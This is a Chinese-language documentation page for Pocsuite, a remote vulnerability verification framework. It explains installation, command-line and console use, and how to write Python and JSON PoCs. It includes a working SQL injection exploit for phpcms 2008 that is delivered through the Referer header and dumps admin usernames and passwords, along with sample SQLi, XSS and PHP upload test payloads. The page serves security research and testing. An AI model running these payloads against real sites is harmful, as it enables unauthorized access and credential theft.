<section class="section-help-wrapper pull-right">
          <h2>远程 PoC 开发文档</h2>
<script type="text/html" id="j-md-content">

### 关于 Pocsuite<a id="about"></a>

Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 PoC 的远程漏洞验证框架。Pocsuite 是知道创宇安全研究团队发展的基石，是团队发展至今持续维护的一个重要项目，保障了我们的 Web 安全研究能力的领先。

在获取到相关漏洞详情后，任何有一定 Python 开发基础的人都可以基于 Pocsuite 开发出对应漏洞的 PoC ，轻而易举的就可以直接使用 Pocsuite 进行相关的验证和调用，而无需考虑底层代码架构等。

在 Seebug 重新改版上线之际，知道创宇安全研究团队正式对外开放 Pocsuite 框架，任何安全研究人员都可以基于 Pocsuite 进行 PoC 的开发，同时也可以加入 Seebug 漏洞社区，为 Pocsuite 提供贡献或者贡献相关的 PoC。具体的开发文档可以参考下文。

最新文档见 [https://github.com/knownsec/Pocsuite](https://github.com/knownsec/Pocsuite)

### 文档目录
* [简介](#intro)
* [框架](#framework)
 * [获取](#download)
 * [安装](#setup)
 * [使用](#use)
* [编写 PoC](#write_poc)
 * [Python PoC 编写规范](#python_coding)
 * [Json PoC 编写规范](#json_coding)
* [PoC 代码示例](#pocexample)
 * [PoC py 代码示例](#pyexample)
 * [PoC json 代码示例](#jsonexample)
* [PoC 规范说明](#pocstandard)
 * [PoC 命名规范](#named)
 * [漏洞类型规范](#category)
 * [PoC 编写注意事项](#notice)
* [演示视频](#run)

### 简介<a id="intro"></a>

此文档将详细描述如何使用 Pocsuite 框架。基于 Pocsuite 这个框架，你可以编写出属于你自己的 PoC。

### 框架<a id="framework"></a>

项目地址：https://github.com/knownsec/pocsuite

最新版的文档请参考 github 仓库中 Pocsuite开发文档。


#### 获取 Pocsuite<a id="download"></a>

* Clone 代码
```
    $ git clone git@github.com:knownsec/pocsuite.git
```

* 或者直接下载并解压
```
    $ wget https://github.com/knownsec/pocsuite/archive/master.zip
    $ unzip master.zip
```

  目录结构：
```
pocsuite
├── docs #说明文档
├── POCAPI.md #POC编写规范及相关API
├── pocsuite #pocsuite主程序
│   ├── data #基础数据
│   ├── lib
│   │   ├── controller
│   │   ├── core #核心组件
│   │   ├── parse #参数处理封装
│   │   ├── request #网络请求封装
│   │   └── utils #常用工具包
│   ├── modules
│   │   └── tmp #临时目录
│   ├── pcs-attack.py #攻击程序
│   ├── pcs-console.py #控制台程序
│   ├── pcs-verify.py #验证程序
│   ├── pocsuite.py #pocsuite主入口程序
│   ├── tests #测试poc目录
│   └── thirdparty #第三方库
└── README.md
```

#### 安装框架<a id="setup"></a>

解压缩 Pocsuite 后，无需安装，切换至 pocsuite 目录即可使用。

在命令行输入
```
    $ python pocsuite.py --version

                              ,--. ,--.
 ,---. ,---. ,---.,---.,--.,--`--,-'  '-.,---.  {0.3-sebug-b30225e}
| .-. | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. :
| '-' ' '-' \ `--.-'  `'  ''  |  | |  | \   --.
|  |-' `---' `---`----' `----'`--' `--'  `----'
`--'                                            http://seebug.org
```


#### 使用<a id="use"></a>

Pocsuite 支持命令行模式(cli)和交互式控制台模式(console)


##### **命令行模式**<a id="command_view"></a>

命令行模式可以对目标发起 Verify 和 Attack 模式的测试,
进入 pocsuite 目录,执行 pocsuite.py

获取命令帮助列表
```
    $ python pocsuite.py -h
```


假定你已经有一个 PoC(poc_example.py),并且将其保存在 tests 目录(**任意目录, 以下如无说明默认为 ./tests** )下面:

PoC 目前支持.py 文件和 .json 文件两种，两者用法一样,具体参考下方说明

* Verify 模式，验证目标是否存在漏洞:
```
    $ python pocsuite.py -r tests/poc_example.py -u http://www.example.com/ --verify
```

* Attack 模式:
```
    $ python pocsuite.py -r tests/poc_example.py -u http://www.example.com/ --attack
```

* 如果你有一个 URL 文件(url.txt),要批量验证,你可以:
```
    $ python pocsuite.py -r test/poc_example.py -f url.txt --verify
```
> Attack 模式只需要替换 ```--verify``` 参数为 ```--attack``` 即可.

* 加载 tests 目录下的所有 PoC 对目标进行测试:
```
    $ python pocsuite.py -r tests/ -u http://www.example.com --verify
```

* 使用多线程,默认线程数为1:
```
    $ python pocsuite.py -r test/ -f url.txt --verify --threads 10
```


##### **控制台交互式视图**<a id="console_view"></a>

进入控制台交互式视图:
```
    $ python pcs-console.py
```

通用命令：
```
    ls, help       查看当前可用命令及帮助
    q, exit        退出当前视图/返回父视图
```

在 **Pcs 视图** (Pcs>) 下,常用的命令:
```
    config          进入目标配置子视图
    poc             进入poc配置子视图
    verify          开始验证
    attack          开始攻击
    shell [command] 执行系统shell命令
    hi, history     历史命令
    show            显示当前系统设置
    set             修改系统设置
    shortcuts       查看短命令

```

在 **Config 视图** (Pcs.Config>) 下,常用的命令:

```
    [Command]
       thread       : 设置最大线程数(默认为1)
       url          : 设置目标URL
       urlFile      : 载入文件中的URL
       q            : 返回父视图
    [Option]
       header       : 设置 http 请求头.
       proxy        : 设置代理.格式:'(http|https|socks4|socks5)://address:port'.
       timeout      : 设置超时时间. (默认 5s)
       show         : 显示当前配置.

```

在 **PoC 视图** (Pcs.poc>) 下,常用的命令:

```
    avaliable   查看所有可用的POC
    search      从可用的POC列表中检索
    load <Id>   加载指定Id的POC
    loaded      查看已经加载的POC
    unload      查看未加载的POC
    clear       移出所有已加载的POC
```


##### **使用 Pcs-console 步骤** <a id="console_use"></a>

1、 进入 Config 子视图,设置目标：

```
    Pcs.Config>url
    Pcs.config.url>www.example.com
    Pcs.Config>show
    +---------+-----------------+
    |  config |      value      |
    +---------+-----------------+
    |   url   | www.example.com |
    | threads |        1        |
    +---------+-----------------+

或

    Pcs.Config>url example.com
    Pcs.Config>show
    +---------+-------------+
    |  config |    value    |
    +---------+-------------+
    |   url   | example.com |
    | threads |      1      |
    +---------+-------------+

```

2、 进入 PoC 子视图，加载指定 PoC

```
    Pcs>poc
    Pcs.poc>avaliable
    +-------+------------------+
    | pocId | avaliablePocName |
    +-------+------------------+
    |   1   | _poc_example1.py |
    |   2   | poc_example1.py  |
    +-------+------------------+

    Pcs.poc>load 1
    [*] load poc file(s) success!

    Pcs.poc>q

```

3、 Verify/Attack

```
    Pcs>verify
    [15:13:26] [*] starting 1 threads
    [15:13:26] [*] poc:'_poc_example1' target:'www.example.com'
```

##### **PoC 测试报告自动生成** <a id="report"></a>

Pocsuite 默认只会将执行结果输出显示在屏幕上，如需将结果自动生成报告并保存，在扫描参数后加 ```--report [report_file]``` 即可生成 html格式报告。

```
    $ python pocsuite.py -r tests/poc_example2.py -u example.com --verify --report /tmp/report.html
```

上述命令执行后，会调用 `poc_example2.py` 并将结果保存到 `/tmp/report.html` 中。

#### 编写 PoC <a id="write_poc"></a>

Pocsuite 是一个 Python 开发的 PoC 框架, 支持 Python 和 Json 两种 PoC 编写方式．

#### Python PoC 编写规范<a id="python_coding"></a>

> 特别注意：编写的代码要尽可能符合 PEP8 规范，严格规范 4 个空格为缩进！相关规范可以参考 [PythonCodingRule](http://blog.knownsec.com/Knownsec_RD_Checklist/PythonCodingRule.pdf)。

1、 新建 .py 文件，导入相关模块，新建继承框架的基础类 `TestPOC(POCBase)`

```
    #!/usr/bin/env python
    # coding: utf-8

    from pocsuite.net import req
    from pocsuite.poc import POCBase, Output
    from pocsuite.utils import register


    class TestPOC(POCBase):
        ...
```

2、 填写 PoC 信息字段,**```所有信息都要认真填写不然不会过审核的```**

```
    vulID = '1571'  # VUL ID
    version = '1' #默认为1
    author = 'zhengdt' # PoC 作者的大名
    vulDate = '2014-10-16' #漏洞公开的时间,不知道就写今天
    createDate = '2014-10-16'# 编写 PoC 的日期
    updateDate = '2014-10-16'#POC更新的时间,默认和编写时间一样
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']# 漏洞地址来源,0day 不用写
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC'# PoC 名称
    appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
    appName = 'Drupal'# 漏洞应用名称
    appVersion = '7.x'# 漏洞影响版本
    vulType = 'SQL Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    ''' # 漏洞简要描述
    samples = []# 测试样例,就是用 PoC 测试成功的网站，选填
```
3、 编写 Verify 模式：

Verify 模式即为单纯的验证目标网站是否有漏洞，不对目标进行任何修改，删除等有危害的行为。在 Pocsuite 中用户需要定义 ```_verify``` 函数，定义方式如下：
```
    def _verify(self):
        output = Output(self)
        result = {} #result是返回结果
        # 验证代码
```

验证成功后需要把验证结果赋值给 result 变量。result 里的 key 必须按照下面规范填写

```
    'Result':{
       'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
       'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
       'FileInfo':  {'Filename':'xxx','Content':'xxx'},
       'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
       'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
       'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
       'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
       'SiteAttr':  {'Process':'xxx'}
    }
```

 Example:
```
  if keywords:
      result['VerifyInfo'] = {}
      result['VerifyInfo']['URL'] = self.url + payload
```
result 每个 key 值相对应的意义：

```
    correspond：[

    {  name: 'DBInfo',        value：'数据库内容' },
        {  name: 'Username',      value: '管理员用户名'},
        {  name: 'Password',      value：'管理员密码' },
        {  name: 'Salt',          value: '加密盐值'},
        {  name: 'Uid',           value: '用户ID'},
        {  name: 'Groupid',       value: '用户组ID'},

    {  name: 'ShellInfo',     value: 'Webshell信息'},
        {  name: 'URL',           value: 'Webshell地址'},
        {  name: 'Content',       value: 'Webshell内容'},

    {  name: 'FileInfo',      value: '文件信息'},
        {  name: 'Filename',      value: '文件名称'},
        {  name: 'Content',       value: '文件内容'},

    {  name: 'XSSInfo',       value: '跨站脚本信息'},
        {  name: 'URL',           value: '验证URL'},
        {  name: 'Payload',       value: '验证Payload'},

    {  name: 'AdminInfo',     value: '管理员信息'},
        {  name: 'Uid',           value: '管理员ID'},
        {  name: 'Username',      value: '管理员用户名'},
        {  name: 'Password',      value: '管理员密码'},

    {  name: 'Database',      value：'数据库信息' },
        {  name: 'Hostname',      value: '数据库主机名'},
        {  name: 'Username',      value：'数据库用户名' },
        {  name: 'Password',      value: '数据库密码'},
        {  name: 'DBname',        value: '数据库名'},

    {  name: 'VerifyInfo',    value: '验证信息'},
        {  name: 'URL',           value: '验证URL'},
        {  name: 'Postdata',      value: '验证POST数据'},
        {  name: 'Path',          value: '网站绝对路径'},

    {  name: 'SiteAttr',      value: '网站服务器信息'},
    {  name: 'Process',       value: '服务器进程'}

    ]
```
4、 编写 Attack 模式：

Attack 模式可以对目标进行 get shell ，查询管理员帐号密码等操作.定义它的方法与 Verify 模式类似

```
    def _attack(self):
        output = Output(self)
        result = {}
        # 攻击代码
```
和 Verify 模式一样，攻击成功后需要把攻击得到结果赋值给 result 变量。

 **注意：如果该 PoC 没有 Attack 模式，可以在 _attack() 函数下加入一句 return self._verify() 这样你就无需再写 _attack() 函数了。**

5、 注册 PoC 实现类

在类的外部调用 `register()` 方法注册 PoC 类

```
    Class TestPOC(POCBase):
        #POC内部代码

    #注册TestPOC类
    register(TestPOC)
```

##### **Json PoC 编写**<a id="json_coding"></a>

1、 首先新建一个 .json 文件,文件名应当符合 **PoC 命名规范**

2、 Json PoC 有两个 key，`pocInfo` 和 `pocExecute`，分别代表 PoC 信息部分执行体。

```
{
    "pocInfo":{},
    "pocExecute":{}
}
```

3、 填写 pocInfo 部分：

```
{
    "pocInfo":{
        "vulID": "poc-2015-0107",
        "name": "Openssl 1.0.1 内存读取 信息泄露漏洞",
        "protocol": "http",
        "author": "test",
        "references": ["http://drops.wooyun.org/papers/1381"],
        "appName": "OpenSSL",
        "appVersion" : "1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1",
        "vulType": "Information Disclosure",
        "desc" :"OpenSSL是一个强大的安全套接字层密码库。这次漏洞被称为OpenSSL“心脏出血”漏洞，这是关于 OpenSSL 的信息泄漏漏洞导致的安全问题。它使攻击者能够从内存中读取最多64 KB的数据。安全人员表示：无需任何特权信息或身份验证，我们就可以从我们自己的（测试机上）偷来X.509证书的私钥、用户名与密码、聊天工具的消息、电子邮件以及重要的商业文档和通信等数据.",
        "samples": ["http://www.baidu.com", "http://www.qq.com"]
    },
    "pocExecute":{}
}
```
各字段的含义与 Python PoC 属性部分相同。

4、 填写 pocExecute 部分：
pocExecute 分为 verify 和 attack 两部分
```
{
    "pocInfo":{},
    "pocExecute":{
        "verify":[],
        "attack":[]
    }
}
```
填写verify部分:
```
{
    "pocInfo":{},
    "pocExecute":{
        "verify":[
            {
                "step": "1",
                "method": "get",
                "vulPath": "/api.php",
                "params": "test=123&sebug=1234",
                "necessary": "",
                "headers": {"cookie": "123"},
                "status":"200",
                "match": {
                    "regex": ["baidu","google"],
                    "time": "time"
                }
            },
            {
                "step": "2",
                "method": "get",
                "vulPath": "/api.php",
                "params": "test=sebug",
                "necessary": "",
                "headers": "",
                "status": "200",
                "match":{
                    "regex": ["\d{0,3}"],
                    "time": "0.01"
                }
            }
        ],
        "attack":[]
    }
}
```
字段说明：

  * step: 按照上下顺序执行，值可以取0和非0两种。如果 step 的值为 0,那么验证成功后就会返回成功，如果 step 的值不为 0,那么需要全部满足后才返回成功。
  * method：请求方式
  * vulPath：请求路径
  * params：请求参数
  * necessary：请求中必须存在的数据，例如 cookie
  * headers：自定义请求头部
  * status: 返回的 HTTP 状态码
  * match：返回体，其中：
    * regex：表示字符串匹配，为数组类型，当且仅当 regex 中所有的元素都匹配成功的情况下，返回 True，否则返回 False.支持正则表达式
    * time：为时间差，当 raw 和 time 同时存在时，取raw，time 失效。

**verify 中每个元素代表一个请求。**

填写 Attack 部分:
```
{
    "pocInfo":{},
    "pocExecute":{
        "verify":[],
        "attack":[
            {
                "step": "1",
                "method": "get",
                "vulPath": "/api.php",
                "params": "test=123&sebug=1234",
                "necessary": "",
                "headers": {"cookie": "123"},
                "status":"200",
                "match": {
                    "regex": ["baidu","google"],
                    "time": "time"
                },
                "result":{
                  "AdminInfo":{
                    "Password":"<regex>www(.+)com"
                  }
                }
            }
        ]
    }
}
```

attack部分和verify部分类似，比verify 部分多一个 "result".

* "result": 为输出，其类型为 dict
* "AdminInfo": 是管理员信息，此项见 [Result 说明](#resultstandard)
* "Password": 是result中 AdminInfo 中的字段，其值支持正则表达式，如果需要使用正则表达式来获取页面信息，则需要在表达式字符串前加`<regex>`

#### PoC 代码示例<a id="pocexample"></a>

#### PoC py代码示例<a id="pyexample"></a>

[phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.seebug.org/vuldb/ssvid-62274) PoC:

```
#!/usr/bin/env python
# coding: utf-8
import re
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '62274'  # ssvid
    version = '1'
    author = ['Medici.Yan']
    vulDate = '2011-11-21'
    createDate = '2015-09-23'
    updateDate = '2015-09-23'
    references = ['http://www.seebug.org/vuldb/ssvid-62274']
    name = '_62274_phpcms_2008_place_sql_inj_PoC'
    appPowerLink = 'http://www.phpcms.cn'
    appName = 'PHPCMS'
    appVersion = '2008'
    vulType = 'SQL Injection'
    desc = '''
        phpcms 2008 中广告模块，存在参数过滤不严，
        导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，
        如果关闭了错误显示，可以采用基于时间和错误的盲注
    '''
    samples = ['http://10.1.200.28/']

    def _attack(self):
        result = {}
        vulurl = urlparse.urljoin(self.url, '/data/js.php?id=1')
        payload = "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT concat(char(45,45),username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"
        head = {
            'Referer': payload
        }
        resp = req.get(vulurl, headers=head)
        if resp.status_code == 200:
            match_result = re.search(r'Duplicate entry \'1--(.+)---(.+)--\' for key', resp.content, re.I | re.M)
            if match_result:
                result['AdminInfo'] = {}
                result['AdminInfo']['Username'] = match_result.group(1)
                result['AdminInfo']['Password'] = match_result.group(2)
        return self.parse_attack(result)

    def _verify(self):
        result = {}
        vulurl = urlparse.urljoin(self.url, '/data/js.php?id=1')
        payload = "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2), md5(1))a from information_schema.tables group by a)b), '0')#"
        head = {
            'Referer': payload
        }
        resp = req.get(vulurl, headers=head)
        if resp.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
            result['VerifyInfo']['Payload'] = payload

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
```

#### PoC json 代码示例<a id="jsonexample"></a>

[phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.seebug.org/vuldb/ssvid-62274) PoC:

由于json不支持注释,所以具体字段意义请参考上文，涉及到的靶场请自行根据Seebug漏洞详情搭建。

```
{
    "pocInfo": {
        "vulID": "62274",
        "version":"1",
        "vulDate":"2011-11-21",
        "createDate":"2015-09-15",
        "updateDate":"2015-09-15",
        "name": "phpcms_2008_ads_place.class.php_sql-inj",
        "protocol": "http",
        "vulType": "SQL Injection",
        "author": "Medici.Yan",
        "references": ["http://www.seebug.org/vuldb/ssvid-62274"],
        "appName": "phpcms",
        "appVersion" : "2008",
        "appPowerLink":"http://www.phpcms.cn",
        "desc" :"phpcms 2008 中广告模块，存在参数过滤不严，导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，如果关闭了错误显示，可以采用基于时间和错误的盲注",
        "samples": ["http://127.0.0.1"]
    },

    "pocExecute":{
        "verify": [
            {
                "step": "0",
                "method": "get",
                "vulPath": "/data/js.php",
                "params": "id=1",
                "necessary": "",
                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"},
                "status": "200",
                "match": {
                    "regex": ["c4ca4238a0b923820dcc509a6f75849b"],
                    "time":""
                }
            }
        ],
        "attack": [
            {
                "step": "0",
                "method": "get",
                "vulPath": "/data/js.php",
                "params": "id=1",
                "necessary": "",
                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"},
                "status":"200",
                "match":{
                    "regex": ["Duplicate"],
                    "time": ""
                },
                "result":{
                    "AdminInfo":{
                        "Username":"<regex>--(.+)---",
                        "Password": "<regex>---(.+)--"
                    }
                }
            }
        ]
    }
}

```
#### PoC 规范说明<a id="pocstandard"></a>

#### PoC 命名规范<a id="named"></a>
 PoC 命名分成 3 个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名中的所有字母改写为小写，所有的符号改成_。文件名不能有特殊字符和大写字母。 规范的文件名示例
```
    _1847_seeyon_3_1_login_info_disclosure.py
```


#### 漏洞类型规范<a id="category"><a>

参考[漏洞分类](http://seebug.org/category)

#### PoC 编写注意事项<a id="notice"></a>

1、 Verify 模式为了防止误报的产生,我们一般使用的让页面输出一个自定义的字符串。

比如:

检测 SQL 注入时,```select md5(0x2333333)```
```
if '5e2e9b556d77c86ab48075a94740b6f7' in content:
  result['VerifyInfo'] = {}
  result['VerifyInfo']['URL'] = self.url+payload
```

检测 XSS 漏洞时```alert('<0x2333333>')```
```
if '<0x2333333>' in content:
  result['VerifyInfo'] = {}
  result['VerifyInfo']['URL'] = self.url+payload
```

检测 PHP 文件上传是否成功。`<?php echo md5(0x2333333);unlink(__FILE__);?>`
```
if '5e2e9b556d77c86ab48075a94740b6f7' in content:
  result['VerifyInfo'] = {}
  result['VerifyInfo']['URL'] = self.url+payload
```

2、 任意文件如果需要知道网站路径才能读取文件的话,可以读取系统文件进行验证,要写 Windows 版和 Linux 版两个版本。

3、 Verify 模式下,上传的文件一定要删掉

4、 程序可以通过某些方法获取表前缀，just do it；若不行，保持默认表前缀

5、 PoC 编写好后，务必进行测试，测试规则为：5个不受漏洞的网站，确保 PoC 攻击不成功；5个受漏洞影响的网站，确保 PoC 攻击成功。

###运行程序<a id="run"></a>
<video width="550" height="400" controls="controls" style="margin-top:-30px;">
   <source src="/static/images/pocsuite_demo.mp4" type="video/mp4"/>pocsuite_demo.mp4
          您的浏览器不支持 video 标签
</video>
* 如果浏览器不支持播放，请直接访问 [pocsuite_demo.mp4](/static/images/pocsuite_demo.mp4)
</script>
<div id="j-md-wrapper" class="help-md-wrapper"><h3 id="-pocsuite-a-id-about-a-">关于 Pocsuite<a id="about"></a></h3>
<p>Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 PoC 的远程漏洞验证框架。Pocsuite 是知道创宇安全研究团队发展的基石，是团队发展至今持续维护的一个重要项目，保障了我们的 Web 安全研究能力的领先。</p>
<p>在获取到相关漏洞详情后，任何有一定 Python 开发基础的人都可以基于 Pocsuite 开发出对应漏洞的 PoC ，轻而易举的就可以直接使用 Pocsuite 进行相关的验证和调用，而无需考虑底层代码架构等。</p>
<p>在 Seebug 重新改版上线之际，知道创宇安全研究团队正式对外开放 Pocsuite 框架，任何安全研究人员都可以基于 Pocsuite 进行 PoC 的开发，同时也可以加入 Seebug 漏洞社区，为 Pocsuite 提供贡献或者贡献相关的 PoC。具体的开发文档可以参考下文。</p>
<p>最新文档见 <a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a></p>
<h3 id="-">文档目录</h3>
<ul>
<li><a href="#intro">简介</a></li>
<li><a href="#framework">框架</a><ul>
<li><a href="#download">获取</a></li>
<li><a href="#setup">安装</a></li>
<li><a href="#use">使用</a></li>
</ul>
</li>
<li><a href="#write_poc">编写 PoC</a><ul>
<li><a href="#python_coding">Python PoC 编写规范</a></li>
<li><a href="#json_coding">Json PoC 编写规范</a></li>
</ul>
</li>
<li><a href="#pocexample">PoC 代码示例</a><ul>
<li><a href="#pyexample">PoC py 代码示例</a></li>
<li><a href="#jsonexample">PoC json 代码示例</a></li>
</ul>
</li>
<li><a href="#pocstandard">PoC 规范说明</a><ul>
<li><a href="#named">PoC 命名规范</a></li>
<li><a href="#category">漏洞类型规范</a></li>
<li><a href="#notice">PoC 编写注意事项</a></li>
</ul>
</li>
<li><a href="#run">演示视频</a></li>
</ul>
<h3 id="-a-id-intro-a-">简介<a id="intro"></a></h3>
<p>此文档将详细描述如何使用 Pocsuite 框架。基于 Pocsuite 这个框架，你可以编写出属于你自己的 PoC。</p>
<h3 id="-a-id-framework-a-">框架<a id="framework"></a></h3>
<p>项目地址：<a href="https://github.com/knownsec/pocsuite">https://github.com/knownsec/pocsuite</a></p>
<p>最新版的文档请参考 github 仓库中 Pocsuite开发文档。</p>
<h4 id="-pocsuite-a-id-download-a-">获取 Pocsuite<a id="download"></a></h4>
<ul>
<li><p>Clone 代码</p>
<pre class="hljs ruby"><code>  <span class="hljs-variable">$ </span>git clone git<span class="hljs-variable">@github</span>.<span class="hljs-symbol">com:</span>knownsec/pocsuite.git
</code></pre></li>
<li><p>或者直接下载并解压</p>
<pre class="hljs cs"><code>  $ wget https:<span class="hljs-comment">//github.com/knownsec/pocsuite/archive/master.zip</span>
  $ unzip master.zip
</code></pre><p>目录结构：</p>
<pre class="hljs coffeescript"><code>pocsuite
├── docs <span class="hljs-comment">#说明文档</span>
├── POCAPI.md <span class="hljs-comment">#POC编写规范及相关API</span>
├── pocsuite <span class="hljs-comment">#pocsuite主程序</span>
│   ├── data <span class="hljs-comment">#基础数据</span>
│   ├── lib
│   │   ├── controller
│   │   ├── core <span class="hljs-comment">#核心组件</span>
│   │   ├── parse <span class="hljs-comment">#参数处理封装</span>
│   │   ├── request <span class="hljs-comment">#网络请求封装</span>
│   │   └── utils <span class="hljs-comment">#常用工具包</span>
│   ├── modules
│   │   └── tmp <span class="hljs-comment">#临时目录</span>
│   ├── pcs-attack.py <span class="hljs-comment">#攻击程序</span>
│   ├── pcs-<span class="hljs-built_in">console</span>.py <span class="hljs-comment">#控制台程序</span>
│   ├── pcs-verify.py <span class="hljs-comment">#验证程序</span>
│   ├── pocsuite.py <span class="hljs-comment">#pocsuite主入口程序</span>
│   ├── tests <span class="hljs-comment">#测试poc目录</span>
│   └── thirdparty <span class="hljs-comment">#第三方库</span>
└── README.md
</code></pre></li>
</ul>
<h4 id="-a-id-setup-a-">安装框架<a id="setup"></a></h4>
<p>解压缩 Pocsuite 后，无需安装，切换至 pocsuite 目录即可使用。</p>
<p>在命令行输入</p>
<pre class="hljs coffeescript"><code>    $ python pocsuite.py --version

                              ,--. ,--.
 ,---. ,---. ,---.,---.,--.,--`<span class="javascript">--,-<span class="hljs-string">'  '</span>-.,---.  {<span class="hljs-number">0.3</span>-sebug-b30225e}
| .-. | .-. | .--(  .-<span class="hljs-string">'|  ||  ,--'</span>-.  .-| .-. :
| <span class="hljs-string">'-'</span> <span class="hljs-string">' '</span>-<span class="hljs-string">' \ </span></span>`--.-<span class="hljs-string">'  `'</span>  <span class="hljs-string">''</span>  |  | |  | \   --.
|  |-<span class="hljs-string">' `---'</span> `<span class="javascript">---</span>`----<span class="hljs-string">' `----'</span>`<span class="javascript">--<span class="hljs-string">' </span></span>`--<span class="hljs-string">'  `----'</span>
`<span class="javascript">--<span class="hljs-string">'                                            http://seebug.org
</span></span></code></pre><h4 id="-a-id-use-a-">使用<a id="use"></a></h4>
<p>Pocsuite 支持命令行模式(cli)和交互式控制台模式(console)</p>
<h5 id="-a-id-command_view-a-"><strong>命令行模式</strong><a id="command_view"></a></h5>
<p>命令行模式可以对目标发起 Verify 和 Attack 模式的测试,
进入 pocsuite 目录,执行 pocsuite.py</p>
<p>获取命令帮助列表</p>
<pre class="hljs ruby"><code>    <span class="hljs-variable">$ </span>python pocsuite.py -h
</code></pre><p>假定你已经有一个 PoC(poc_example.py),并且将其保存在 tests 目录(<strong>任意目录, 以下如无说明默认为 ./tests</strong> )下面:</p>
<p>PoC 目前支持.py 文件和 .json 文件两种，两者用法一样,具体参考下方说明</p>
<ul>
<li><p>Verify 模式，验证目标是否存在漏洞:</p>
<pre class="hljs coffeescript"><code>  $ python pocsuite.py -r tests<span class="hljs-regexp">/poc_example.py -u http:/</span><span class="hljs-regexp">/www.example.com/</span> --verify
</code></pre></li>
<li><p>Attack 模式:</p>
<pre class="hljs coffeescript"><code>  $ python pocsuite.py -r tests<span class="hljs-regexp">/poc_example.py -u http:/</span><span class="hljs-regexp">/www.example.com/</span> --attack
</code></pre></li>
<li><p>如果你有一个 URL 文件(url.txt),要批量验证,你可以:</p>
<pre class="hljs bash"><code>  $ python pocsuite.py -r <span class="hljs-built_in">test</span>/poc_example.py <span class="hljs-operator">-f</span> url.txt --verify
</code></pre><blockquote>
<p>Attack 模式只需要替换 <code>--verify</code> 参数为 <code>--attack</code> 即可.</p>
</blockquote>
</li>
<li><p>加载 tests 目录下的所有 PoC 对目标进行测试:</p>
<pre class="hljs cs"><code>  $ python pocsuite.py -r tests/ -u http:<span class="hljs-comment">//www.example.com --verify</span>
</code></pre></li>
<li><p>使用多线程,默认线程数为1:</p>
<pre class="hljs bash"><code>  $ python pocsuite.py -r <span class="hljs-built_in">test</span>/ <span class="hljs-operator">-f</span> url.txt --verify --threads <span class="hljs-number">10</span>
</code></pre></li>
</ul>
<h5 id="-a-id-console_view-a-"><strong>控制台交互式视图</strong><a id="console_view"></a></h5>
<p>进入控制台交互式视图:</p>
<pre class="hljs coffeescript"><code>    $ python pcs-<span class="hljs-built_in">console</span>.py
</code></pre><p>通用命令：</p>
<pre class="hljs bash"><code>    ls, <span class="hljs-built_in">help</span>       查看当前可用命令及帮助
    q, <span class="hljs-built_in">exit</span>        退出当前视图/返回父视图
</code></pre><p>在 <strong>Pcs 视图</strong> (Pcs&gt;) 下,常用的命令:</p>
<pre class="hljs bash"><code>    config          进入目标配置子视图
    poc             进入poc配置子视图
    verify          开始验证
    attack          开始攻击
    shell [<span class="hljs-built_in">command</span>] 执行系统shell命令
    hi, <span class="hljs-built_in">history</span>     历史命令
    show            显示当前系统设置
    <span class="hljs-built_in">set</span>             修改系统设置
    shortcuts       查看短命令
</code></pre><p>在 <strong>Config 视图</strong> (Pcs.Config&gt;) 下,常用的命令:</p>
<pre class="hljs coffeescript"><code>    [Command]
       thread       : 设置最大线程数(默认为<span class="hljs-number">1</span>)
       url          : 设置目标URL
       urlFile      : 载入文件中的URL
       q            : 返回父视图
    [Option]
       header       : 设置 http 请求头.
       proxy        : 设置代理.格式:<span class="hljs-string">'(http|https|socks4|socks5)://address:port'</span>.
       timeout      : 设置超时时间. (默认 <span class="hljs-number">5</span>s)
       show         : 显示当前配置.
</code></pre><p>在 <strong>PoC 视图</strong> (Pcs.poc&gt;) 下,常用的命令:</p>
<pre class="hljs sql"><code>    avaliable   查看所有可用的POC
    search      从可用的POC列表中检索
    <span class="hljs-operator"><span class="hljs-keyword">load</span> &lt;Id&gt;   加载指定Id的POC
    loaded      查看已经加载的POC
    unload      查看未加载的POC
    clear       移出所有已加载的POC
</span></code></pre><h5 id="-pcs-console-a-id-console_use-a-"><strong>使用 Pcs-console 步骤</strong> <a id="console_use"></a></h5>
<p>1、 进入 Config 子视图,设置目标：</p>
